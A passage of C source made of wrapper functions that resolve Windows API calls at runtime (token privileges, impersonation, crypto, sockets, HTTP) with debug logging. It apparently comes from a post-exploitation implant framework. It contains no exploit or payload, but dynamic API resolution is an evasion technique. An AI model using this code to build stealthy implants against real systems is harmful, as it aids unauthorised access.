    dprintf("[WINAPI][winapi_kernel32_ConnectNamedPipe] Calling ConnectNamedPipe @ %p", pConnectNamedPipe);
    if (pConnectNamedPipe) {
        return pConnectNamedPipe(hNamedPipe, lpOverlapped);
    }
    return FALSE;
}

BOOL winapi_kernel32_GetOverlappedResult(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait) {
    BOOL (*pGetOverlappedResult)(HANDLE hFile, LPOVERLAPPED lpOverlapped, LPDWORD lpNumberOfBytesTransferred, BOOL bWait) = GetFunction(KERNEL32_DLL, "GetOverlappedResult");
    dprintf("[WINAPI][winapi_kernel32_GetOverlappedResult] Calling GetOverlappedResult @ %p", pGetOverlappedResult);
    if (pGetOverlappedResult) {
        return pGetOverlappedResult(hFile, lpOverlapped, lpNumberOfBytesTransferred, bWait);
    }
    return FALSE;
}

BOOL winapi_kernel32_ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) {
    BOOL (*pReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped) = GetFunction(KERNEL32_DLL, "ReadFile");
    dprintf("[WINAPI][winapi_kernel32_ReadFile] Calling ReadFile @ %p", pReadFile);
    if (pReadFile) {
        return pReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
    }
    return FALSE;
}

HANDLE winapi_kernel32_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
    HANDLE (*pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) = GetFunction(KERNEL32_DLL, "CreateThread");
    dprintf("[WINAPI][winapi_kernel32_CreateThread] Calling CreateThread @ %p", pCreateThread);
    if (pCreateThread) {
        return pCreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
    }
    return NULL;
}

BOOL winapi_kernel32_ResetEvent(HANDLE hEvent) {
    BOOL (*pResetEvent)(HANDLE hEvent) = GetFunction(KERNEL32_DLL, "ResetEvent");
    dprintf("[WINAPI][winapi_kernel32_ResetEvent] Calling ResetEvent @ %p", pResetEvent);
    if (pResetEvent) {
        return pResetEvent(hEvent);
    }
    return FALSE;
}

BOOL winapi_kernel32_SetThreadErrorMode(DWORD dwNewMode, LPDWORD lpOldMode) {
    BOOL (*pSetThreadErrorMode)(DWORD dwNewMode, LPDWORD lpOldMode) = GetFunction(KERNEL32_DLL, "SetThreadErrorMode");
    dprintf("[WINAPI][winapi_kernel32_SetThreadErrorMode] Calling SetThreadErrorMode @ %p", pSetThreadErrorMode);
    if (pSetThreadErrorMode) {
        return pSetThreadErrorMode(dwNewMode, lpOldMode);
    }
    return FALSE;
}

// END: kernel32.dll
// START: advapi32.dll

BOOL winapi_advapi32_OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) {
    BOOL (*pOpenProcessToken)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) = GetFunction(ADVAPI32_DLL, "OpenProcessToken");
    dprintf("[WINAPI][winapi_advapi32_OpenProcessToken] Calling OpenProcessToken @ %p", pOpenProcessToken);
    if (pOpenProcessToken) {
        return pOpenProcessToken(ProcessHandle, DesiredAccess, TokenHandle);
    }
    return FALSE;
}

BOOL winapi_advapi32_AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) {
    BOOL (*pAdjustTokenPrivileges)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength) = GetFunction(ADVAPI32_DLL, "AdjustTokenPrivileges");
    dprintf("[WINAPI][winapi_advapi32_AdjustTokenPrivileges] Calling AdjustTokenPrivileges @ %p", pAdjustTokenPrivileges);
    if (pAdjustTokenPrivileges) {
        return pAdjustTokenPrivileges(TokenHandle, DisableAllPrivileges, NewState, BufferLength, PreviousState, ReturnLength);
    }
    return FALSE;
}

BOOL winapi_advapi32_ImpersonateLoggedOnUser(HANDLE hToken) {
    BOOL (*pImpersonateLoggedOnUser)(HANDLE hToken) = GetFunction(ADVAPI32_DLL, "ImpersonateLoggedOnUser");
    dprintf("[WINAPI][winapi_advapi32_ImpersonateLoggedOnUser] Calling ImpersonateLoggedOnUser @ %p", pImpersonateLoggedOnUser);
    if (pImpersonateLoggedOnUser) {
        return pImpersonateLoggedOnUser(hToken);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptDuplicateKey(HCRYPTKEY hKey, DWORD* pdwReserved, DWORD dwFlags, HCRYPTKEY* phKey) {
    BOOL (*pCryptDuplicateKey)(HCRYPTKEY hKey, DWORD* pdwReserved, DWORD dwFlags, HCRYPTKEY* phKey) = GetFunction(ADVAPI32_DLL, "CryptDuplicateKey");
    dprintf("[WINAPI][winapi_advapi32_CryptDuplicateKey] Calling CryptDuplicateKey @ %p", pCryptDuplicateKey);
    if (pCryptDuplicateKey) {
        return pCryptDuplicateKey(hKey, pdwReserved, dwFlags, phKey);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptSetKeyParam(HCRYPTKEY hKey, DWORD dwParam, const BYTE* pbData, DWORD dwFlags) {
    BOOL (*pCryptSetKeyParam)(HCRYPTKEY hKey, DWORD dwParam, const BYTE* pbData, DWORD dwFlags) = GetFunction(ADVAPI32_DLL, "CryptSetKeyParam");
    dprintf("[WINAPI][winapi_advapi32_CryptSetKeyParam] Calling CryptSetKeyParam @ %p", pCryptSetKeyParam);
    if (pCryptSetKeyParam) {
        return pCryptSetKeyParam(hKey, dwParam, pbData, dwFlags);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptDecrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen) {
    BOOL (*pCryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen) = GetFunction(ADVAPI32_DLL, "CryptDecrypt");
    dprintf("[WINAPI][winapi_advapi32_CryptDecrypt] Calling CryptDecrypt @ %p", pCryptDecrypt);
    if (pCryptDecrypt) {
        return pCryptDecrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptGenRandom(HCRYPTPROV hProv, DWORD dwLen, BYTE* pbBuffer) {
    BOOL (*pCryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE* pbBuffer) = GetFunction(ADVAPI32_DLL, "CryptGenRandom");
    dprintf("[WINAPI][winapi_advapi32_CryptGenRandom] Calling CryptGenRandom @ %p", pCryptGenRandom);
    if (pCryptGenRandom) {
        return pCryptGenRandom(hProv, dwLen, pbBuffer);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptEncrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen, DWORD dwBufLen) {
    BOOL (*pCryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen, DWORD dwBufLen) = GetFunction(ADVAPI32_DLL, "CryptEncrypt");
    dprintf("[WINAPI][winapi_advapi32_CryptEncrypt] Calling CryptEncrypt @ %p", pCryptEncrypt);
    if (pCryptEncrypt) {
        return pCryptEncrypt(hKey, hHash, Final, dwFlags, pbData, pdwDataLen, dwBufLen);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptDestroyKey(HCRYPTKEY hKey) {
    BOOL (*pCryptDestroyKey)(HCRYPTKEY hKey) = GetFunction(ADVAPI32_DLL, "CryptDestroyKey");
    dprintf("[WINAPI][winapi_advapi32_CryptDestroyKey] Calling CryptDestroyKey @ %p", pCryptDestroyKey);
    if (pCryptDestroyKey) {
        return pCryptDestroyKey(hKey);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags) {
    BOOL (*pCryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags) = GetFunction(ADVAPI32_DLL, "CryptReleaseContext");
    dprintf("[WINAPI][winapi_advapi32_CryptReleaseContext] Calling CryptReleaseContext @ %p", pCryptReleaseContext);
    if (pCryptReleaseContext) {
        return pCryptReleaseContext(hProv, dwFlags);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptImportKey(HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey) {
    BOOL (*pCryptImportKey)(HCRYPTPROV hProv, const BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey) = GetFunction(ADVAPI32_DLL, "CryptImportKey");
    dprintf("[WINAPI][winapi_advapi32_CryptImportKey] Calling CryptImportKey @ %p", pCryptImportKey);
    if (pCryptImportKey) {
        return pCryptImportKey(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);
    }
    return FALSE;
}

BOOL winapi_advapi32_OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle) {
    BOOL (*pOpenThreadToken)(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle) = GetFunction(ADVAPI32_DLL, "OpenThreadToken");
    dprintf("[WINAPI][winapi_advapi32_OpenThreadToken] Calling OpenThreadToken @ %p", pOpenThreadToken);
    if (pOpenThreadToken) {
        return pOpenThreadToken(ThreadHandle, DesiredAccess, OpenAsSelf, TokenHandle);
    }
    return FALSE;
}

BOOL winapi_advapi32_AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1, DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6, DWORD dwSubAuthority7, PSID* pSid) {
    BOOL (*pAllocateAndInitializeSid)(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD dwSubAuthority0, DWORD dwSubAuthority1, DWORD dwSubAuthority2, DWORD dwSubAuthority3, DWORD dwSubAuthority4, DWORD dwSubAuthority5, DWORD dwSubAuthority6, DWORD dwSubAuthority7, PSID* pSid) = GetFunction(ADVAPI32_DLL, "AllocateAndInitializeSid");
    dprintf("[WINAPI][winapi_advapi32_AllocateAndInitializeSid] Calling AllocateAndInitializeSid @ %p", pAllocateAndInitializeSid);
    if (pAllocateAndInitializeSid) {
        return pAllocateAndInitializeSid(pIdentifierAuthority, nSubAuthorityCount, dwSubAuthority0, dwSubAuthority1, dwSubAuthority2, dwSubAuthority3, dwSubAuthority4, dwSubAuthority5, dwSubAuthority6, dwSubAuthority7, pSid);
    }
    return FALSE;
}

DWORD winapi_advapi32_SetEntriesInAclW(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL* NewAcl) {
    DWORD (*pSetEntriesInAclW)(ULONG cCountOfExplicitEntries, PEXPLICIT_ACCESS_W pListOfExplicitEntries, PACL OldAcl, PACL* NewAcl) = GetFunction(ADVAPI32_DLL, "SetEntriesInAclW");
    dprintf("[WINAPI][winapi_advapi32_SetEntriesInAclW] Calling SetEntriesInAclW @ %p", pSetEntriesInAclW);
    if (pSetEntriesInAclW) {
        return pSetEntriesInAclW(cCountOfExplicitEntries, pListOfExplicitEntries, OldAcl, NewAcl);
    }
    return ERROR_INVALID_FUNCTION; // Generic error code
}

BOOL winapi_advapi32_InitializeAcl(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision) {
    BOOL (*pInitializeAcl)(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision) = GetFunction(ADVAPI32_DLL, "InitializeAcl");
    dprintf("[WINAPI][winapi_advapi32_InitializeAcl] Calling InitializeAcl @ %p", pInitializeAcl);
    if (pInitializeAcl) {
        return pInitializeAcl(pAcl, nAclLength, dwAclRevision);
    }
    return FALSE;
}

BOOL winapi_advapi32_InitializeSecurityDescriptor(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision) {
    BOOL (*pInitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR pSecurityDescriptor, DWORD dwRevision) = GetFunction(ADVAPI32_DLL, "InitializeSecurityDescriptor");
    dprintf("[WINAPI][winapi_advapi32_InitializeSecurityDescriptor] Calling InitializeSecurityDescriptor @ %p", pInitializeSecurityDescriptor);
    if (pInitializeSecurityDescriptor) {
        return pInitializeSecurityDescriptor(pSecurityDescriptor, dwRevision);
    }
    return FALSE;
}

BOOL winapi_advapi32_SetSecurityDescriptorDacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted) {
    BOOL (*pSetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bDaclPresent, PACL pDacl, BOOL bDaclDefaulted) = GetFunction(ADVAPI32_DLL, "SetSecurityDescriptorDacl");
    dprintf("[WINAPI][winapi_advapi32_SetSecurityDescriptorDacl] Calling SetSecurityDescriptorDacl @ %p", pSetSecurityDescriptorDacl);
    if (pSetSecurityDescriptorDacl) {
        return pSetSecurityDescriptorDacl(pSecurityDescriptor, bDaclPresent, pDacl, bDaclDefaulted);
    }
    return FALSE;
}

BOOL winapi_advapi32_SetSecurityDescriptorSacl(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bSaclPresent, PACL pSacl, BOOL bSaclDefaulted) {
    BOOL (*pSetSecurityDescriptorSacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor, BOOL bSaclPresent, PACL pSacl, BOOL bSaclDefaulted) = GetFunction(ADVAPI32_DLL, "SetSecurityDescriptorSacl");
    dprintf("[WINAPI][winapi_advapi32_SetSecurityDescriptorSacl] Calling SetSecurityDescriptorSacl @ %p", pSetSecurityDescriptorSacl);
    if (pSetSecurityDescriptorSacl) {
        return pSetSecurityDescriptorSacl(pSecurityDescriptor, bSaclPresent, pSacl, bSaclDefaulted);
    }
    return FALSE;
}

BOOL winapi_advapi32_LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid) {
    BOOL (*pLookupPrivilegeValueW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid) = GetFunction(ADVAPI32_DLL, "LookupPrivilegeValueW");
    dprintf("[WINAPI][winapi_advapi32_LookupPrivilegeValueW] Calling LookupPrivilegeValueW @ %p", pLookupPrivilegeValueW);
    if (pLookupPrivilegeValueW) {
        return pLookupPrivilegeValueW(lpSystemName, lpName, lpLuid);
    }
    return FALSE;
}

// END: advapi32.dll
// START: crypt32.dll

BOOL winapi_crypt32_CryptDecodeObjectEx(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE* pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void* pvStructInfo, DWORD* pcbStructInfo) {
    BOOL (*pCryptDecodeObjectEx)(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE* pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void* pvStructInfo, DWORD* pcbStructInfo) = GetFunction(CRYPT32_DLL, "CryptDecodeObjectEx");
    dprintf("[WINAPI][winapi_crypt32_CryptDecodeObjectEx] Calling CryptDecodeObjectEx @ %p", pCryptDecodeObjectEx);
    if (pCryptDecodeObjectEx) {
        return pCryptDecodeObjectEx(dwCertEncodingType, lpszStructType, pbEncoded, cbEncoded, dwFlags, pDecodePara, pvStructInfo, pcbStructInfo);
    }
    return FALSE;
}

BOOL winapi_crypt32_CryptImportPublicKeyInfo(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY* phKey) {
    BOOL (*pCryptImportPublicKeyInfo)(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY* phKey) = GetFunction(CRYPT32_DLL, "CryptImportPublicKeyInfo");
    dprintf("[WINAPI][winapi_crypt32_CryptImportPublicKeyInfo] Calling CryptImportPublicKeyInfo @ %p", pCryptImportPublicKeyInfo);
    if (pCryptImportPublicKeyInfo) {
        return pCryptImportPublicKeyInfo(hCryptProv, dwCertEncodingType, pInfo, phKey);
    }
    return FALSE;
}

BOOL winapi_crypt32_CertGetCertificateContextProperty(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void* pvData, DWORD* pcbData) {
    BOOL (*pCertGetCertificateContextProperty)(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void* pvData, DWORD* pcbData) = GetFunction(CRYPT32_DLL, "CertGetCertificateContextProperty");
    dprintf("[WINAPI][winapi_crypt32_CertGetCertificateContextProperty] Calling CertGetCertificateContextProperty @ %p", pCertGetCertificateContextProperty);
    if (pCertGetCertificateContextProperty) {
        return pCertGetCertificateContextProperty(pCertContext, dwPropId, pvData, pcbData);
    }
    return FALSE;
}

// END: crypt32.dll
// START: user32.dll

BOOL winapi_user32_GetUserObjectInformationA(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded) {
    BOOL (*pGetUserObjectInformationA)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded) = GetFunction(USER32_DLL, "GetUserObjectInformationA");
    dprintf("[WINAPI][winapi_user32_GetUserObjectInformationA] Calling GetUserObjectInformationA @ %p", pGetUserObjectInformationA);
    if (pGetUserObjectInformationA) {
        return pGetUserObjectInformationA(hObj, nIndex, pvInfo, nLength, lpnLengthNeeded);
    }
    return FALSE;
}

HDESK winapi_user32_GetThreadDesktop(DWORD dwThreadId) {
    HDESK (*pGetThreadDesktop)(DWORD dwThreadId) = GetFunction(USER32_DLL, "GetThreadDesktop");
    dprintf("[WINAPI][winapi_user32_GetThreadDesktop] Calling GetThreadDesktop @ %p", pGetThreadDesktop);
    if (pGetThreadDesktop) {
        return pGetThreadDesktop(dwThreadId);
    }
    return NULL;
}

// END: user32.dll
// START: ws2_32.dll
int winapi_ws2_32_WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData) {
    int (*pWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData) = GetFunction(WS2_32_DLL, "WSAStartup");
    dprintf("[WINAPI][winapi_ws2_32_WSAStartup] Calling WSAStartup @ %p", pWSAStartup);
    if (pWSAStartup) {
        return pWSAStartup(wVersionRequired, lpWSAData);
    }
    return WSASYSNOTREADY;
}

SOCKET winapi_ws2_32_socket(int af, int type, int protocol) {
    SOCKET (*psocket)(int af, int type, int protocol) = GetFunction(WS2_32_DLL, "socket");
    dprintf("[WINAPI][winapi_ws2_32_socket] Calling socket @ %p", psocket);
    if (psocket) {
        return psocket(af, type, protocol);
    }
    return INVALID_SOCKET;
}

int winapi_ws2_32_connect(SOCKET s, const struct sockaddr* name, int namelen) {
    int (*pconnect)(SOCKET s, const struct sockaddr* name, int namelen) = GetFunction(WS2_32_DLL, "connect");
    dprintf("[WINAPI][winapi_ws2_32_connect] Calling connect @ %p", pconnect);
    if (pconnect) {
        return pconnect(s, name, namelen);
    }
    return SOCKET_ERROR;
}

SOCKET winapi_ws2_32_accept(SOCKET s, struct sockaddr* addr, int* addrlen) {
    SOCKET (*paccept)(SOCKET s, struct sockaddr* addr, int* addrlen) = GetFunction(WS2_32_DLL, "accept");
    dprintf("[WINAPI][winapi_ws2_32_accept] Calling accept @ %p", paccept);
    if (paccept) {
        return paccept(s, addr, addrlen);
    }
    return INVALID_SOCKET;
}

int winapi_ws2_32_setsockopt(SOCKET s, int level, int optname, const char* optval, int optlen) {
    int (*psetsockopt)(SOCKET s, int level, int optname, const char* optval, int optlen) = GetFunction(WS2_32_DLL, "setsockopt");
    dprintf("[WINAPI][winapi_ws2_32_setsockopt] Calling setsockopt @ %p", psetsockopt);
    if (psetsockopt) {
        return psetsockopt(s, level, optname, optval, optlen);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_recv(SOCKET s, char* buf, int len, int flags) {
    int (*precv)(SOCKET s, char* buf, int len, int flags) = GetFunction(WS2_32_DLL, "recv");
    dprintf("[WINAPI][winapi_ws2_32_recv] Calling recv @ %p", precv);
    if (precv) {
        return precv(s, buf, len, flags);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_WSADuplicateSocketA(SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo) {
    int (*pWSADuplicateSocketA)(SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo) = GetFunction(WS2_32_DLL, "WSADuplicateSocketA");
    dprintf("[WINAPI][winapi_ws2_32_WSADuplicateSocketA] Calling WSADuplicateSocketA @ %p", pWSADuplicateSocketA);
    if (pWSADuplicateSocketA) {
        return pWSADuplicateSocketA(s, dwProcessId, lpProtocolInfo);
    }
    return SOCKET_ERROR;
}

// END: ws2_32.dll
// START: wininet.dll

HINTERNET winapi_wininet_InternetOpenW(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags) {
    HINTERNET (*pInternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags) = GetFunction(WININET_DLL, "InternetOpenW");
    dprintf("[WINAPI][winapi_wininet_InternetOpenW] Calling InternetOpenW @ %p", pInternetOpenW);
    if (pInternetOpenW) {
        return pInternetOpenW(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
    }
    return NULL;
}

HINTERNET winapi_wininet_InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
    HINTERNET (*pInternetConnectW)(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) = GetFunction(WININET_DLL, "InternetConnectW");
    dprintf("[WINAPI][winapi_wininet_InternetConnectW] Calling InternetConnectW @ %p", pInternetConnectW);
    if (pInternetConnectW) {
        return pInternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    }
    return NULL;
}

HINTERNET winapi_wininet_HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
    HINTERNET (*pHttpOpenRequestW)(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) = GetFunction(WININET_DLL, "HttpOpenRequestW");
    dprintf("[WINAPI][winapi_wininet_HttpOpenRequestW] Calling HttpOpenRequestW @ %p", pHttpOpenRequestW);
    if (pHttpOpenRequestW) {
        return pHttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
    }
    return NULL;
}

BOOL winapi_wininet_InternetSetOptionW(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) {
    BOOL (*pInternetSetOptionW)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) = GetFunction(WININET_DLL, "InternetSetOptionW");
    dprintf("[WINAPI][winapi_wininet_InternetSetOptionW] Calling InternetSetOptionW @ %p", pInternetSetOptionW);
    if (pInternetSetOptionW) {
        return pInternetSetOptionW(hInternet, dwOption, lpBuffer, dwBufferLength);
    }
    return FALSE;
}

BOOL winapi_wininet_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
    BOOL (*pHttpSendRequestW)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) = GetFunction(WININET_DLL, "HttpSendRequestW");
    dprintf("[WINAPI][winapi_wininet_HttpSendRequestW] Calling HttpSendRequestW @ %p", pHttpSendRequestW);
    if (pHttpSendRequestW) {
        return pHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
    }
    return FALSE;
}

BOOL winapi_wininet_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) {
    BOOL (*pHttpQueryInfoW)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) = GetFunction(WININET_DLL, "HttpQueryInfoW");
    dprintf("[WINAPI][winapi_wininet_HttpQueryInfoW] Calling HttpQueryInfoW @ %p", pHttpQueryInfoW);
    if (pHttpQueryInfoW) {
        return pHttpQueryInfoW(hRequest, dwInfoLevel, lpBuffer, lpdwBufferLength, lpdwIndex);
    }
    return FALSE;
}

BOOL winapi_wininet_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    BOOL (*pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) = GetFunction(WININET_DLL, "InternetReadFile");
    dprintf("[WINAPI][winapi_wininet_InternetReadFile] Calling InternetReadFile @ %p", pInternetReadFile);
    if (pInternetReadFile) {
        return pInternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    }
    return FALSE;
}

BOOL winapi_wininet_InternetCloseHandle(HINTERNET hInternet) {
    BOOL (*pInternetCloseHandle)(HINTERNET hInternet) = GetFunction(WININET_DLL, "InternetCloseHandle");
    dprintf("[WINAPI][winapi_wininet_InternetCloseHandle] Calling InternetCloseHandle @ %p", pInternetCloseHandle);
    if (pInternetCloseHandle) {
        return pInternetCloseHandle(hInternet);
    }
    return FALSE;
}

BOOL winapi_wininet_InternetCrackUrlW(LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents) {
    BOOL (*pInternetCrackUrlW)(LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents) = GetFunction(WININET_DLL, "InternetCrackUrlW");
    dprintf("[WINAPI][winapi_wininet_InternetCrackUrlW] Calling InternetCrackUrlW @ %p", pInternetCrackUrlW);
    if (pInternetCrackUrlW) {
        return pInternetCrackUrlW(lpszUrl, dwUrlLength, dwFlags, lpUrlComponents);
    }
    return FALSE;
}

// END: wininet.dll
// START: rpcrt4.dll

HRESULT winapi_rpcrt4_CoCreateGuid(GUID* pguid) {
    HRESULT (*pCoCreateGuid)(GUID* pguid) = GetFunction(RPCRT4_DLL, "CoCreateGuid");
    dprintf("[WINAPI][winapi_rpcrt4_CoCreateGuid] Calling CoCreateGuid @ %p", pCoCreateGuid);
    if (pCoCreateGuid) {
        return pCoCreateGuid(pguid);
    }
    return RPC_S_INTERNAL_ERROR;
}

// END: rpcrt4.dll
// START: winhttp.dll

HINTERNET winapi_winhttp_WinHttpOpen(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags) {
    HINTERNET (*pWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags) = GetFunction(WINHTTP_DLL, "WinHttpOpen");
    dprintf("[WINAPI][winapi_winhttp_WinHttpOpen] Calling WinHttpOpen @ %p", pWinHttpOpen);
    if (pWinHttpOpen) {
        return pWinHttpOpen(pszAgentW, dwAccessType, pszProxyW, pszProxyBypassW, dwFlags);
    }
    return NULL;
}

HINTERNET winapi_winhttp_WinHttpConnect(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved) {
    HINTERNET (*pWinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved) = GetFunction(WINHTTP_DLL, "WinHttpConnect");
    dprintf("[WINAPI][winapi_winhttp_WinHttpConnect] Calling WinHttpConnect @ %p", pWinHttpConnect);
    if (pWinHttpConnect) {
        return pWinHttpConnect(hSession, pswzServerName, nServerPort, dwReserved);
    }
    return NULL;
}

